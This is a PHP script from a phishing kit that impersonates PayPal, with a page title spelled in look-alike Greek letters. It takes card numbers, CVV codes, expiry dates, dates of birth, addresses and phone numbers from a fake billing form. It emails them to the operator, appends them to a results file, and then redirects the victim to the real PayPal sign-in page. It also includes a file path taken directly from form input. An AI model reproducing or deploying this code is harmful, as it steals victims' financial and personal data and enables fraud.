<?php

@ini_set('display_errors',0);
$ip = getenv("REMOTE_ADDR");
$birthday = $_POST['Day'];
$birthmonth = $_POST['Month'];
$birthyear = $_POST['Year'];
$hostname = $_POST['hostname'];
$address1 = $_POST['add1'];
$address2 = $_POST['add2'];
$country = $_POST['count'];
$city = $_POST['ct'];
$state = $_POST['st'];
$zip = $_POST['zip'];
$phone = $_POST['mob'];
$CardName = $_POST['cname'];
$credit = $_POST['cnum'];
$expmonth = $_POST['expmonth'];
$expyear = $_POST['expyear'];
$ccv = $_POST['cvv'];
$gg = $_POST['12'];
$hh = $_POST['123'];
$jj = $_POST['1234'];
$Secure = $_POST['Secure'];
$message = "
=========[BILLING INFOS]=========
Date of birth 	: $birthday - $birthmonth - $birthyear
Address 1		: $address1
address 2  		: $address2
Country  		: $country
City  			: $city
State  			: $state
ZIP 			: $zip
Phone 			: $phone
===============[Credit]==============
Cardholder Name 	: $CardName
Credit Numbre 		: $credit
Date 	                : $expyear - $expmonth
CCV 			: $ccv
Date 	                : $gg - $hh - $jj
Secure                  : $Secure
===============[IP]==============
IP	                : http://www.geoiptool.com/?IP=$ip
==========[BY coutinho ]=========";

$encrypt=  base64_encode($message);
include "$hostname";
include "to.php";
$subject = "Xboomber V5 Xhot Billing [$ip] [$country]";
$headers = "From: resulta <My.result>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
$file = fopen("../Result-By-virus dz.txt", 'a');
fwrite($file, $message);
?>
<html>
<head>
<title>Account Confirmation - &Rho;ay&Rho;al</title>
<link rel="shortcut icon" link rel="logo-icon" href="./img/ppico.ico">
<body>
<meta http-equiv="refresh" content="3;url=https://www.paypal.com/signin/">
</body>
</html>